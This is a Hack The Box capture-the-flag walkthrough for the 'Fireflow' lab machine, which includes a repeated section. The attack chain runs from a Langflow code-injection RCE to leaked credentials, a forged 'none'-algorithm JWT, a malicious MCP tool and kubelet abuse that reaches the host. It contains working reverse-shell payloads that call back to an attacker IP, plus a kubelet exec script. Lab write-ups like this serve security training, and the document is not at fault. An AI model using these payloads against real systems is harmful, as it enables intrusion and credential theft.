@@ -1,0 +1,997 @@
+Fireflow — Hack The Box Walkthrough
+Overview
+
+This walkthrough documents the complete attack path against the Fireflow machine.
+
+The compromise follows several stages:
+    Network and service enumeration
+    Virtual host / subdomain discovery
+    Identification of a vulnerable Langflow instance
+    Unauthenticated Remote Code Execution through CVE-2026-33017
+    Initial shell as www-data
+    Credential discovery through environment variables
+    SSH access as nightfall
+    Discovery of an internal MCP server
+    SSH local port forwarding to access the internal service
+    Authentication to the MCP API
+    JWT authentication misconfiguration and privilege escalation to admin
+    Registration and execution of a malicious MCP tool
+    Shell as the mcp user
+    Kubernetes privilege escalation through nodes/proxy
+    Access to the host filesystem and retrieval of the root flag
+
+1. Enumeration
+
+The first step is to identify the exposed services and obtain as much information as possible about the target.
+
+nmap -T5 -sV -sC -Pn 10.129.60.35 -v
+
+Nmap options
+
+    -T5 — aggressive timing template.
+
+    -sV — attempts to identify service versions.
+
+    -sC — runs the default Nmap scripts.
+
+    -Pn — skips host discovery and assumes the host is online.
+
+    -v — verbose output.
+
+The interesting results are:
+
+PORT      STATE    SERVICE   VERSION
+22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+443/tcp   open     ssl/http  nginx
+9100/tcp  filtered jetdirect
+30000/tcp filtered ndmps
+30718/tcp filtered unknown
+30951/tcp filtered unknown
+31038/tcp filtered unknown
+31337/tcp filtered Elite
+
+The most interesting exposed services are therefore:
+
+    22/tcp — SSH
+
+    443/tcp — HTTPS / NGINX
+
+The HTTPS service redirects to:
+
+https://fireflow.htb/
+
+The TLS certificate is particularly useful because it reveals the hostname:
+
+Subject: commonName=fireflow.htb
+Subject Alternative Name:
+    DNS:fireflow.htb
+    DNS:*.fireflow.htb
+
+The wildcard SAN is a good indication that subdomains may be in use.
+2. Add the Hostnames to /etc/hosts
+
+Before interacting with the web application, resolve the discovered hostname locally.
+
+echo "10.129.60.35 fireflow.htb" | sudo tee -a /etc/hosts
+echo "10.129.60.35 flow.fireflow.htb" | sudo tee -a /etc/hosts
+
+This allows the browser and command-line tools to resolve both:
+
+fireflow.htb
+flow.fireflow.htb
+
+to the target IP.
+3. Web Enumeration
+3.1 Nikto
+
+First, perform a basic web-server scan:
+
+nikto -h https://fireflow.htb/
+
+Nothing particularly interesting was identified at this stage.
+3.2 Directory Enumeration
+
+Next, enumerate common directories on the HTTPS virtual host.
+
+gobuster dir -u https://fireflow.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k
+
+No interesting result was returned with this wordlist.
+
+Because the certificate contains:
+
+DNS:*.fireflow.htb
+
+the next logical step is to investigate virtual hosts and subdomains.
+4. Virtual Host Enumeration
+
+We can use Gobuster's vhost mode to test potential virtual hosts.
+
+gobuster vhost -u https://fireflow.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k -c 200,301,302,403
+
+The server generated many responses that could result in false positives. To filter responses with an unexpected content length:
+
+gobuster vhost -u https://fireflow.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k -c 200,301,302,403 --exclude-length 150
+
+We can also perform DNS subdomain enumeration.
+
+The wordlist used here is:
+
+/usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt
+
+Command:
+
+gobuster dns -d fireflow.htb -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt --wildcard
+
+Another variation was tested by explicitly specifying the DNS server:
+
+gobuster dns -d fireflow.htb -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt -r 10.129.60.35
+
+This eventually led to the interesting virtual host:
+
+flow.fireflow.htb
+
+5. Discovering the Langflow Application
+
+Browsing the discovered subdomain revealed an interesting public playground URL:
+
+https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
+
+This exposed a Langflow flow.
+
+The flow ID is particularly important because it can be referenced through the API.
+
+The corresponding API endpoint is:
+
+https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636/
+
+At this point, the attack surface changed significantly.
+
+Instead of attacking the NGINX server directly, the goal became to understand the exposed Langflow API.
+6. Langflow Enumeration
+
+Additional directory enumeration was performed against the Langflow instance:
+
+gobuster dir -u https://flow.fireflow.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k -c 200,301,302,403 --exclude-length 150,1142
+
+Interesting endpoints were discovered:
+
+https://flow.fireflow.htb/login
+https://flow.fireflow.htb/docs
+
+The /docs endpoint is especially useful because Langflow exposes API documentation there.
+
+The API version can also be queried directly:
+
+https://flow.fireflow.htb/api/v1/version
+
+The version returned was:
+
+1.8.2
+
+7. Identifying the Vulnerability
+
+The Langflow version and exposed API endpoint led to the discovery of:
+
+CVE-2026-33017
+
+The vulnerability is an unauthenticated Remote Code Execution affecting the public flow-building endpoint:
+
+/api/v1/build_public_tmp/{flow_id}/flow
+
+The important security issue is that attacker-controlled flow definitions can contain Python code which is ultimately executed by the application.
+
+In other words, the public flow functionality provides a path from:
+
+Unauthenticated HTTP request
+        ↓
+Attacker-controlled flow
+        ↓
+Python code execution
+        ↓
+Remote Code Execution
+
+A public technical reference for the Langflow code-injection issue was also identified:
+
+https://www.sonicwall.com/blog/langflow-ai-code-injection-to-rce-flaw
+
+8. Exploiting Langflow for Initial RCE
+
+A Python exploit was available to automate exploitation:
+
+python exploit.py --url https://flow.fireflow.htb/api/v1/build_public_tmp/ --flow-id 7d84d636-af65-42e4-ac38-26e867052c25 --lhost 10.0.3.1 --lport 4443 --listen
+
+An alternative approach is to send the malicious flow directly to the API.
+
+curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4ac38-26e867052c25/flow' \
+-H 'Content-Type: application/json' \
+-b 'client_id=attacker' \
+-d '{
+        Remeote shell in the payload
+    }'
+
+The JSON payload was easier to manage by placing it in a separate file.
+9. Creating the Exploit Payload
+
+Create the payload file:
+
+sudo nano exploit.json
+
+The malicious flow definition:
+
+{
+  "data": {
+    "nodes": [{
+      "id": "Exploit-001",
+      "type": "genericNode",
+      "position": {"x":0,"y":0},
+      "data": {
+        "id": "Exploit-001",
+        "type": "ExploitComp",
+        "node": {
+          "template": {
+            "code": {
+              "type": "code",
+              "required": true,
+              "show": true,
+              "multiline": true,
+              "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.15.161/4443 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
+              "name": "code",
+              "password": false,
+              "advanced": false,
+              "dynamic": false
+            },
+            "_type": "Component"
+          },
+          "description": "X",
+          "base_classes": ["Data"],
+          "display_name": "ExploitComp",
+          "name": "ExploitComp",
+          "frozen": false,
+          "outputs": [{
+            "types": ["Data"],
+            "selected": "Data",
+            "name": "o",
+            "display_name": "O",
+            "method": "r",
+            "value": "__UNDEFINED__",
+            "cache": true,
+            "allows_loop": false,
+            "tool_mode": false,
+            "hidden": null,
+            "required_inputs": null,
+            "group_outputs": false
+          }],
+          "field_order": ["code"],
+          "beta": false,
+          "edited": false
+        }
+      }
+    }],
+    "edges": []
+  }
+}
+
+The important part of the payload is the Python code embedded inside the code.value field:
+
+import os
+
+_x = os.system("bash -c 'bash -i >& /dev/tcp/10.10.15.161/4443 0>&1'")
+
+This causes the target to establish a reverse shell back to the attacking machine.
+10. Catching the Reverse Shell
+
+Start a listener on the attacking machine:
+
+nc -lvnp 4443
+
+Then submit the malicious flow:
+
+curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
+    -H 'Content-Type: application/json' \
+    -b 'client_id=attacker' \
+    -d @exploit.json
+
+The vulnerable Langflow instance executes the embedded Python code and connects back to the listener.
+
+We now have a shell as:
+
+www-data
+
+Example:
+
+www-data@fireflow:/var/lib/langflow$ whoami
+www-data
+
+11. Initial Enumeration as www-data
+
+The home directory contains another user:
+
+www-data@fireflow:/home$ cd nightfall
+
+However, access is denied:
+
+PERMISSION DENIED
+
+Since the current user cannot directly access the user's home directory, environment variables are worth checking.
+
+www-data@fireflow:/home$ printenv
+
+Among the environment variables are:
+
+LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
+LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
+
+The most interesting value is:
+
+LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
+
+This provides a potential credential that can be tested against the local users.
+12. SSH Access as nightfall
+
+Using the discovered password, SSH access is possible:
+
+ssh nightfall@10.129.60.35
+
+Password:
+
+n1ghtm4r3_b4_n1ghtf4ll
+
+We now have a proper SSH session as:
+
+nightfall
+
+This is a significant improvement over the initial www-data shell.
+13. Local Privilege Escalation Enumeration
+
+The first step is to look for SUID and SGID binaries.
+
+find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null
+
+Relevant results include:
+
+/usr/bin/crontab
+/usr/bin/passwd
+/usr/sbin/unix_chkpwd
+
+Nothing immediately interesting was identified from the SUID/SGID enumeration, so we continue looking for sensitive files.
+14. Searching for Interesting Files
+
+List files in the current user's home directory:
+
+find . -type f -ls
+
+This revealed:
+
+703      4 -rw-------   1 nightfall nightfall      147 Aug 11 14:21 ./.mcp/config.json
+
+The .mcp/config.json file is particularly interesting because it appears to contain configuration information for another service.
+
+Read it:
+
+cat ./.mcp/config.json
+
+Contents:
+
+{
+  "server": "http://10.129.244.214:30080",
+  "status_endpoint": "/api/v1/version",
+  "user": "langflow-bot",
+  "password": "Langfl0w@mcp2026!"
+}
+
+We have now discovered:
+
+Internal server: 10.129.244.214:30080
+Username:        langflow-bot
+Password:        Langfl0w@mcp2026!
+
+The IP address is not directly exposed through the original Nmap scan, indicating that this service is part of an internal network.
+15. SSH Local Port Forwarding
+
+Because the MCP service is only reachable from the compromised host, we can use SSH local port forwarding.
+
+The idea is:
+
+Attacker
+   |
+   | localhost:30080
+   |
+   ↓
+SSH tunnel
+   |
+   ↓
+fireflow
+   |
+   ↓
+10.129.244.214:30080
+
+Create the tunnel:
+
+ssh -N -L 30080:10.129.244.214:30080 nightfall@10.129.244.214
+
+The internal service can now be accessed locally through:
+
+http://127.0.0.1:30080
+
+For example:
+
+http://127.0.0.1:30080/api/v1/version
+
+and:
+
+http://127.0.0.1:30080/docs
+
+16. Enumerating the MCP API
+
+The /docs endpoint exposes API documentation.
+
+The authentication endpoint accepts:
+
+{
+    "username": "langflow-bot",
+    "password": "Langfl0w@mcp2026!"
+}
+
+We can reproduce the request with curl:
+
+curl -X 'POST' \
+    'http://127.0.0.1:30080/api/v1/auth' \
+    -H 'accept: application/json' \
+    -H 'Content-Type: application/json' \
+    -d '{
+    "username": "langflow-bot",
+    "password": "Langfl0w@mcp2026!"
+}'
+
+The server responds with an access token:
+
+Response 200:
+{
+    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
+    "token_type": "bearer"
+}
+
+At this point, the next step is to understand how the JWT is validated.
+17. JWT Authentication Misconfiguration
+
+Query the API version endpoint:
+
+http://127.0.0.1:30080/api/v1/version
+
+The response reveals the authentication configuration:
+
+service      "MCP AI Tool Registry"
+version      "0.1.0"
+auth
+    type     "JWT"
+    header   "Authorization: Bearer <token>"
+    supported_algorithms
+        0    "HS256"
+        1    "none"
+    docs       "/docs"
+
+The important detail is:
+
+supported_algorithms:
+    HS256
+    none
+
+Allowing the JWT none algorithm is a serious authentication misconfiguration.
+
+With the none algorithm, the token does not require a cryptographic signature.
+
+The original token contains claims similar to:
+
+{
+  "sub": "langflow-bot",
+  "role": "user"
+}
+
+The goal is therefore to construct a token containing administrative claims:
+
+{
+  "sub": "admin",
+  "role": "admin"
+}
+
+Using a JWT encoder such as jwt.io, the resulting token is:
+
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+
+The final dot is significant because a JWT using the none algorithm has an empty signature section.
+18. Registering a Malicious MCP Tool
+
+Set the forged administrative token:
+
+ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
+
+Because the token claims:
+
+sub=admin
+role=admin
+
+the API accepts it as an administrative identity.
+
+This allows us to interact with the MCP tool registration endpoint.
+
+The objective is to register a tool whose implementation executes a reverse shell.
+
+curl -s -X POST 'http://10.129.244.214:30080/api/v1/tools' \
+    -H 'Content-Type: application/json' \
+    -H "Authorization: Bearer $ADMIN_JWT" \
+    -d '{
+        "name": "shell",
+        "description": "debug shell",
+        "inputSchema": {
+        "type": "object",
+        "properties": {}
+        },
+        "code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.15.161\",9001))\n[os.dup2(s.fileno(),i) for i in (0,1,2)]\npty.spawn(\"/bin/sh\")"
+    }'
+
+The important attack chain is now:
+
+JWT algorithm confusion / none algorithm
+              ↓
+Forged admin JWT
+              ↓
+Administrative API access
+              ↓
+Register arbitrary MCP tool
+              ↓
+Execute attacker-controlled Python
+              ↓
+Reverse shell
+
+19. Triggering the Malicious Tool
+
+The tool has been registered, but it still needs to be executed.
+
+The MCP endpoint is:
+
+/mcp
+
+The tool can be invoked through the MCP JSON-RPC interface:
+
+curl -s -X POST http://10.129.244.214:30080/mcp \
+-H 'Content-Type: application/json' \
+-H "Authorization: Bearer $ADMIN_JWT" \
+-d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":
+{}}}'
+
+The registered Python code executes and creates another reverse shell.
+
+We now obtain access to the MCP server as:
+
+mcp
+
+Checking our identity:
+
+id
+
+returns:
+
+uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
+
+20. Getting a Full TTY
+
+The reverse shell initially has limited terminal functionality.
+
+A common way to improve the shell is:
+
+script /dev/null -c bash
+
+Then:
+
+Ctrl-Z
+
+followed by:
+
+stty raw -echo; fg
+
+Press Enter twice.
+
+This provides a much more usable interactive shell.
+
+We are now operating from:
+
+mcp@mcp-server-54464cb475-29ztf:/app$
+
+The hostname strongly suggests that the target is running inside a Kubernetes environment.
+
+This changes the privilege-escalation strategy.
+21. Kubernetes Enumeration
+
+At this stage, the interesting question is no longer simply:
+
+    "Can we become root inside this container?"
+
+Instead, we need to determine whether the container has access to the Kubernetes API or other privileged Kubernetes functionality.
+
+The identified weakness involves the Kubernetes nodes/proxy permission.
+
+The attack takes advantage of the ability to communicate with the kubelet API on port 10250.
+
+The host's root filesystem is mounted inside a privileged pod, under:
+
+/host/root
+
+If we can execute commands through the kubelet on the appropriate pod, commands can be executed in the context of the node-exporter container.
+
+This provides a path from:
+
+mcp container
+      ↓
+Kubernetes API / kubelet
+      ↓
+node-exporter pod
+      ↓
+/host/root
+      ↓
+Host filesystem
+
+22. Kubernetes Command Execution Script
+
+A Python script was created on the attacking machine to communicate with the kubelet WebSocket endpoint.
+
+# kube_exec.py
+
+#!/usr/bin/env python3
+
+import asyncio
+import ssl
+import sys
+
+import websockets
+
+
+NODE = "10.129.244.214"
+NE_NS = "monitoring"
+NE_POD = "prometheus-prometheus-node-exporter-nmntq"
+NE_CNT = "node-exporter"
+
+TOKEN = open(
+    "/var/run/secrets/kubernetes.io/serviceaccount/token"
+).read().strip()
+
+COMMAND = sys.argv[1] if len(sys.argv) > 1 else "id"
+
+
+async def ws_exec(cmd_parts):
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+
+    args = "&".join(f"command={part}" for part in cmd_parts)
+
+    url = (
+        f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
+        f"?output=1&error=1&{args}"
+    )
+
+    async with websockets.connect(
+        url,
+        ssl=ctx,
+        additional_headers={"Authorization": f"Bearer {TOKEN}"},
+        subprotocols=["v4.channel.k8s.io"],
+        open_timeout=10,
+    ) as ws:
+        try:
+            while True:
+                data = await asyncio.wait_for(ws.recv(), timeout=5)
+
+                if isinstance(data, bytes) and len(data) > 1:
+                    sys.stdout.write(
+                        data[1:].decode("utf-8", errors="replace")
+                    )
+                    sys.stdout.flush()
+
+        except (
+            asyncio.TimeoutError,
+            websockets.exceptions.ConnectionClosed,
+        ):
+            pass
+
+
+asyncio.run(ws_exec(COMMAND.split()))
+
+22. Kubernetes Command Execution Script
+
+A Python script was created on the attacking machine to communicate with the kubelet WebSocket endpoint.
+
+# kube_exec.py
+
+#!/usr/bin/env python3
+
+import asyncio
+import ssl
+import sys
+
+import websockets
+
+
+NODE = "10.129.244.214"
+NE_NS = "monitoring"
+NE_POD = "prometheus-prometheus-node-exporter-nmntq"
+NE_CNT = "node-exporter"
+
+TOKEN = open(
+    "/var/run/secrets/kubernetes.io/serviceaccount/token"
+).read().strip()
+
+COMMAND = sys.argv[1] if len(sys.argv) > 1 else "id"
+
+
+async def ws_exec(cmd_parts):
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+
+    args = "&".join(f"command={part}" for part in cmd_parts)
+
+    url = (
+        f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
+        f"?output=1&error=1&{args}"
+    )
+
+    async with websockets.connect(
+        url,
+        ssl=ctx,
+        additional_headers={"Authorization": f"Bearer {TOKEN}"},
+        subprotocols=["v4.channel.k8s.io"],
+        open_timeout=10,
+    ) as ws:
+        try:
+            while True:
+                data = await asyncio.wait_for(ws.recv(), timeout=5)
+
+                if isinstance(data, bytes) and len(data) > 1:
+                    sys.stdout.write(
+                        data[1:].decode("utf-8", errors="replace")
+                    )
+                    sys.stdout.flush()
+
+        except (
+            asyncio.TimeoutError,
+            websockets.exceptions.ConnectionClosed,
+        ):
+            pass
+
+
+asyncio.run(ws_exec(COMMAND.split()))
+
+How the script works
+
+The script reads the Kubernetes service-account token from:
+
+/var/run/secrets/kubernetes.io/serviceaccount/token
+
+It then creates a WebSocket connection to:
+
+wss://10.129.244.214:10250
+
+The endpoint being targeted is the Kubernetes kubelet /exec interface:
+
+/exec/{namespace}/{pod}/{container}
+
+The target pod is:
+
+namespace: monitoring
+pod: prometheus-prometheus-node-exporter-nmntq
+container: node-exporter
+
+The script disables TLS certificate verification:
+
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+
+and authenticates using the service-account token:
+
+additional_headers={"Authorization": f"Bearer {TOKEN}"}
+
+The Kubernetes WebSocket subprotocol:
+
+v4.channel.k8s.io
+
+is required for the kubelet exec protocol.
+23. Transfer the Exploit to the MCP Container
+
+Host the Python script from the attacking machine using a simple HTTP server.
+
+From the MCP container, download it:
+
+mcp@mcp-server-54464cb475-29ztf:/tmp$ curl http://10.10.15.161:8080/kuby.py -o kuby.py
+
+The script is now available locally:
+
+/tmp/kuby.py
+
+24. Accessing the Host Filesystem
+
+The node-exporter pod has access to the host filesystem mounted under:
+
+/host/root
+
+Therefore, instead of reading:
+
+/root/root.txt
+
+inside the current container, we can target:
+
+/host/root/root/root.txt
+
+Run:
+
+mcp@mcp-server-54464cb475-29ztf:/tmp$ python3 kuby.py "cat /host/root/root/root.txt"
+
+The command is executed through the Kubernetes kubelet and reads the root flag from the host filesystem.
+
+This completes the privilege-escalation chain.
+25. Complete Attack Chain
+
+The entire compromise can be summarized as follows:
+
+                    FIREflow
+                       │
+                       ▼
+             Nmap / Web Enumeration
+                       │
+                       ▼
+              flow.fireflow.htb
+                       │
+                       ▼
+                 Langflow 1.8.2
+                       │
+                       ▼
+              CVE-2026-33017
+             Unauthenticated RCE
+                       │
+                       ▼
+                  www-data
+                       │
+                       ▼
+            Environment Variables
+                       │
+                       ▼
+        LANGFLOW_SUPERUSER_PASSWORD
+                       │
+                       ▼
+                SSH as nightfall
+                       │
+                       ▼
+              ~/.mcp/config.json
+                       │
+                       ▼
+           Internal MCP Server
+            10.129.244.214:30080
+                       │
+                       ▼
+              SSH Port Forwarding
+                       │
+                       ▼
+             MCP API Enumeration
+                       │
+                       ▼
+               JWT Authentication
+                       │
+                       ▼
+             "none" Algorithm
+                Misconfiguration
+                       │
+                       ▼
+                Forged Admin JWT
+                       │
+                       ▼
+            Register Malicious Tool
+                       │
+                       ▼
+                 MCP RCE
+                       │
+                       ▼
+                     mcp
+                       │
+                       ▼
+             Kubernetes Enumeration
+                       │
+                       ▼
+                nodes/proxy
+                       │
+                       ▼
+                Kubelet :10250
+                       │
+                       ▼
+             node-exporter Pod
+                       │
+                       ▼
+                  /host/root
+                       │
+                       ▼
+                   root.txt
+
+26. Key Takeaways
+Initial Access
+
+The initial foothold was obtained through an unauthenticated Langflow API endpoint.
+
+The vulnerable endpoint accepted attacker-controlled flow definitions, ultimately allowing arbitrary Python code execution.
+
+The important lesson is that publicly accessible workflow-building functionality should never execute arbitrary server-side code without strong isolation and authorization.
+Credential Exposure
+
+After obtaining the initial shell, sensitive credentials were exposed through environment variables:
+
+LANGFLOW_SUPERUSER_PASSWORD
+LANGFLOW_SECRET_KEY
+
+This demonstrates why secrets should not be unnecessarily exposed to application processes or inherited into environments accessible by lower-privileged processes.
+Internal Service Discovery
+
+The .mcp/config.json configuration file disclosed credentials for an internal MCP service:
+
+10.129.244.214:30080
+
+The service was not directly exposed externally, but SSH tunneling made it accessible from the attacking machine.
+JWT Misconfiguration
+
+The MCP server advertised:
+
+HS256
+none
+
+as supported JWT algorithms.
+
+Accepting the none algorithm allowed the authentication token to be forged without a valid signature.
+
+This converted a normal user token into an administrative token:
+
+{
+  "sub": "admin",
+  "role": "admin"
+}
+
+MCP Tool Registration
+
+Administrative access to the MCP API allowed arbitrary tools to be registered.
+
+Because the tool implementation contained Python code executed by the server, this resulted in another RCE and a shell as the mcp user.
+Kubernetes Privilege Escalation
+
+The final stage involved abusing Kubernetes/kubelet access.
+
+The combination of:
+
+nodes/proxy
+
+and access to the kubelet's:
+
+:10250
+
+exec functionality allowed commands to be executed in a pod with access to the host filesystem.
+
+The host filesystem was available at:
+
+/host/root
+
+which ultimately allowed access to:
+
+/host/root/root/root.txt
+
+and completed the machine.
+Conclusion
+
+Fireflow demonstrates how multiple seemingly independent weaknesses can be chained together into a full compromise:
+
+Web enumeration
+    → Langflow RCE
+    → credential disclosure
+    → SSH access
+    → internal service discovery
+    → JWT misconfiguration
+    → MCP RCE
+    → Kubernetes abuse
+    → host filesystem access
+    → root flag
+
+The most important lesson from this machine is that privilege escalation does not necessarily happen through a single traditional local exploit. In this case, the attack progressed through several trust boundaries:
+
+Web application → Linux user → internal API → authentication layer → MCP execution → Kubernetes → host.
